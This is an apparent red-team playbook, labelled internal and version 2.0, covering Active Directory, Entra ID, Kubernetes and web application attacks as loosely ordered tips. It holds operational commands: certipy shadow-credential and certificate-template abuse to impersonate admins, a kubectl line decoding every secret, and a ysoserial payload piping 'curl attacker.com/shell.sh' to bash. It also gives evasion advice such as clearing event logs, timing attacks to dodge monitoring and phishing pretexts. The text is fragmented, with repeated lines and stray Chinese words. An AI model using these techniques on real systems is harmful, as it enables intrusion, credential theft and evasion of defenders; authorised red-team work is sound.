div.div: Classification: RED TEAM - INTERNAL USE ONLY
Network mapping and trust relationship identification
Mail server verification via SMTP checks
⚠️ Rate limit requests to avoid IP bans
💡 Combine multiple sources for 95%+ email coverage
💡 Use trusted IP ranges when possible to reduce suspicion
💡 Target Friday evenings for lower monitoring response
Evilginx3 for MFA bypass via proxy
Gophish for campaign management and tracking
Custom landing pages matching corporate branding
💻 phishlet enable microsoft (Entra ID cookie capture)
⚠️ Use freshly registered domains (1-7 days old)
💡 Implement redirect chains to hide final destination
💡 Capture refresh tokens for long-term access without credentials
Many organizations have weaker security on vendor portals
Password reuse between corporate and vendor accounts
Less monitoring on third-party access points
🛠️ Standard web testing tools + credential stuffing
💡 Search for vendor portals via Google dorks
MSPs often have privileged access to multiple clients
Compromising one MSP can yield multiple organizations
Higher privilege levels than typical user accounts
⚠️ High-value target, increased security monitoring expected
💡 Research MSP relationships through job postings and press releases
BloodHound-CE (Community Edition) - Free and actively maintained
SharpHound - Traditional collector, higher detection risk
AzureHound - Entra ID and Azure environment mapping
⚠️ Session enumeration generates significant LDAP traffic
⚠️ Avoid collection during business hours (9 AM - 5 PM)
💡 Use DCOnly collection mode to reduce network footprint
💡 Compress and exfiltrate data immediately after collection
💡 Clear event logs related to collection if possible
Identify shortest paths to Domain Admin
Map service account permissions and access
💡 Prioritize paths with lowest detection risk
💡 Document all paths for reporting and remediation
AdFind for comprehensive queries (legacy, higher detection)
⚠️ PowerShell logging may capture PowerView usage
💡 Use BOF variants through C2 for reduced detection
💡 Cache results locally to avoid repeated queries
Automated scanning of accessible SMB shares
Pattern matching for passwords, keys, configs
Historical data often contains valid credentials
💡 Target: IT departments, HR, Finance shares first
MiniDump via comsvcs.dll - Built-in, medium detection
NanoDump - Modern, supports PPL bypass attempts
PPLDump - Specifically for Protected Process Light
⚠️ CRITICAL: Mimikatz sekurlsa module is dead for memory in 2026
⚠️ EDR solutions actively monitor LSASS access patterns
💡 Use process names that blend with legitimate tools
💡 Consider remote LSASS dump over network
💡 Target browsers first - highest success rate
💡 Extract cookies for session hijacking opportunities
Offline cracking without account lockout risk
High success rate in older domains
💡 Combine with kernel0x rules for maximum coverage
Often weak passwords on service accounts
💡 Request tickets for all SPNs, not just obvious targets
💡 Service accounts often have password last set dates years ago
Microsoft solution for local admin password management
💡 LAPS passwords are high-value, often unique per machine
💡 Check for legacy LAPS (ms-MCS-AdmPwd) vs Windows LAPS
Captures NTLM hashes from network traffic
Works in most internal networks by default
⚠️ Very noisy, generates大量 authentication attempts
💡 Run during maintenance windows when possible
💡 Use Inveigh over Responder for better OPSEC in some environments
💡 Chain with ntlmrelayx for automatic exploitation
💡 Target Domain Controllers for maximum impact
💡 Can impersonate any user for TGT acquisition
Adds key credential to target account
💻 certipy shadow auto -u user@domain.local -p pass -account DC01$
💡 Works even with complex 20+ character passwords
💡 Can target any account with write permissions
💡 Remove credential after use to cover tracks
Servers can request TGT for any user
Physical access to server = domain compromise
Often found on old Domain Controllers
💡 Monitor for TGT requests from delegation-enabled servers
💡 Target accounts that authenticate to these servers
Still allows impersonation for those services
More common than unconstrained in modern environments
💡 Can be combined with protocol transition for broader access
💻 certipy req -u user -p pass -target pki.local -template User -upn admin@domain.local
💡 Most common and easiest ESC vulnerability
Template has Extended Key Usage for Smart Card
💻 certipy req -u user -p pass -target pki.local -template SmartCard -upn admin@domain.local
Template allows requesting certificates on behalf of others
Use EA certificate to request admin certificates
Modify template to enable ESC1 conditions
Similar to ESC4 but broader scope
CA configuration allows SAN in CSR
💡 Chain with PetitPotam for DC coercion
💡 Works even with LDAP signing enabled
Site server often has high privileges
💡 NAA credentials can provide domain access
💡 SCCM infrastructure often overlooked by security teams
💡 Search for password storage in Exchange scripts
💡 Exchange admins often have domain admin equivalent
PRT provides seamless SSO in hybrid environments
Stolen PRT can generate new access tokens
⚠️ Requires local admin on hybrid-joined device
💡 Can be used from any location, not just corporate network
User enters code on attacker-controlled device
High success rate with proper pretexting
💡 Pretext: "Verify your account" or "Complete security check"
💡 Token valid for extended period (hours to days)
AAD Connect sync account has high privileges
Often has Global Admin equivalent in cloud
💡 MSOL_... account often has Global Admin rights
💡 Can reset any cloud password including Global Admins
Forge SAML tokens with ADFS private key
💡 Tokens can have arbitrary claims and validity
💡 Most impactful cloud attack when available
Maintain access even after password resets
Create malicious app with high permissions
Use client credentials for automated access
🟢 Low detection risk if named appropriately
Create trusted location for attacker IPs
☁️ 6. Cloud Security - Entra ID / Azure / M365
C2 beacon encrypts memory during sleep
Evades memory scanning during sleep periods
💡 Use random sleep intervals to avoid pattern detection
AMSI scans PowerShell and script content
💡 Use Hardware Breakpoints (HWBP) instead of byte patching
💡 More stealthy than traditional hooking methods
💡 Some EDRs detect AMSI patching, test first
💡 Hell's Gate finds clean ntdll.dll sections
💡 Tartarus Gate for indirect syscall execution
💡 Most effective against user-mode EDR hooks
Harder for static analysis to detect
💡 Combine with syscalls for maximum stealth
Check before each engagement for new options
⚠️ High detection risk, triggers security alerts
💡 Valid until krbtgt password rotation (typically 180 days)
🟢 Lower detection risk than Golden Ticket
Changes propagate to all admins every 60 minutes
💡 Adds your rights to ALL domain admins automatically
Sync with local admin password on DC
Physical/remote access to DC = domain access
💻 Bind to winlogon.exe start or specific time triggers
🏢 PART I: Active Directory & Cloud Red Team
⚠️ Active scanning generates大量 401/403 in Kubernetes Audit Logs
⚠️ Security teams monitor for scanning patterns
💡 Can lead directly to pod execution access
💡 Look for default service account tokens
Privileged containers can mount host devices
💡 Can access host network, processes, filesystem
💡 Most reliable breakout method when available
💡 Check all volume mounts immediately on access
Script executes on host when process ends
💡 Executes on host as root automatically
⚠️ CRITICAL: May cause Kernel Panic and node crash
💡 Use only when other methods unavailable
💡 Check runtime version on compromised pod
Every pod has service account token
💡 ALWAYS check this path first on any pod access
💡 This token is your K8s authentication credential
Not all SA tokens have same permissions
Some have cluster-admin, some have minimal access
💡 Look for: get secrets, pods/exec, deployments
💡 Document all permissions for attack planning
💡 Check each namespace for different access levels
💻 kubectl get secrets -o json | jq '.items[].data | map_values(@base64d)'
💡 Look for cloud credentials, database passwords, API keys
💡 Often overlooked but can contain credentials
Can lead to cloud infrastructure access
⚠️ Direct requests to 169.254.169.254 often blocked by Network Policies
⚠️ Cloud IDS (GuardDuty, Defender) monitors metadata access
💡 Use SSRF vulnerabilities if direct access blocked
💡 Metadata can provide full cloud account access
💡 Approve own CSRs with sufficient permissions
💡 Creates certificates valid for extended periods
Runs on every node in cluster
Harder to detect than new deployments
💡 Match resource requests to legitimate containers
💡 Use same image registry as legitimate containers
Inject backdoor into every new pod
💡 Can be configured for specific namespaces
💡 Most powerful persistence mechanism in K8s
Can be abused for DoS or bypass
☸️ PART II: Kubernetes & Cloud-Native Red Team
💻 subfinder -d target.com -all -silent | puredns resolve resolvers.txt -w resolved.txt
💡 Look for dev, staging, test subdomains (weaker security)
⚠️ Avoid aggressive Nmap -T4 scans, WAF will ban IP
💡 Rate limit scanning to avoid detection
💡 Use residential proxies for scanning if available
💡 Fuzz during off-hours for less monitoring
💡 Look for IDOR, SQLi, SSRF in parameters
Execution on attacker's server via callback
May trigger days or weeks later
💡 Target: contact forms, support tickets, feedback
💡 Target admin panels (CRM/ERP) for maximum impact
💡 Keep XSS Hunter server running long-term
Can lead to XSS or logic bypass
Can allow data theft from other domains
💡 Create malicious HTML page for data exfiltration
💡 Backend may ignore CSRF token for GET requests
💡 Create CSRF PoC pages for reporting
⚠️ SQLMap is VERY noisy, triggers WAF/IDS
⚠️ For Red Team: write custom Python scripts
💡 Test all input fields accepting system data
💡 Look for ping, nslookup, curl in parameters
💡 Test login forms with LDAP special characters
💻 Magic Bytes: Add GIF89a; to PHP shell start
💻 java -jar ysoserial.jar CommonsCollections4 "curl attacker.com/shell.sh | bash" > payload.bin
💡 Look for serialized objects in cookies, parameters
💡 Check for Java, .NET, PHP, Python applications
Access internal services via web server
💡 Target: PDF generation, webhook notifications, image downloads
💡 Can lead to internal network pivot
💡 Can provide full cloud account access
💡 If disabled, use field suggestion bypass
💡 Map all queries and mutations for testing
💡 Test all API endpoints with object references
💡 Look for token exposure in logs/URLs
💡 Test for comment injection in assertions
💡 Memory shells require initial file upload then cleanup
Route all traffic through compromised server
💡 Ligolo-ng provides better performance than Chisel
💡 Can pivot to AD (Part I) or K8s (Part II) networks
💡 Use for RDP, SSH, database access
💡 Best for extensive internal network access
🌐 PART III: Web Application Red Team
💻 certipy shadow auto -u user@domain.local -p pass -account DC01$
💻 certipy req -u user -p pass -target pki.local -template User -upn admin@domain.local
💻 kubectl get secrets -o json | jq '.items[].data | map_values(@base64d)'
✅ Verify Rules of Engagement (RoE) signed and documented
✅ Document all approved attack vectors and restrictions
✅ Set up logging and monitoring bypass procedures
✅ Test all tools in lab environment matching target
✅ Set up secure data storage for findings
✅ Create incident response plan if detection occurs
✅ Use sleep obfuscation on all C2 beacons
✅ Avoid automated tools in production environments
✅ Clean up artifacts after each phase completion
✅ Document all actions for final reporting
✅ Use encrypted channels for team communication
✅ Avoid patterns that trigger behavioral detection
✅ Test detection after each major technique
✅ Clean up ALL created accounts and tokens
✅ Debrief with blue team on detection opportunities
✅ Archive all data securely per retention policy
✅ Complete final report within agreed timeframe
✅ Update playbook with new techniques discovered
✅ Verify complete cleanup with blue team
v2.0 (2026): Major expansion with K8s and Cloud sections
🔒 Classification: RED TEAM - INTERNAL USE ONLY
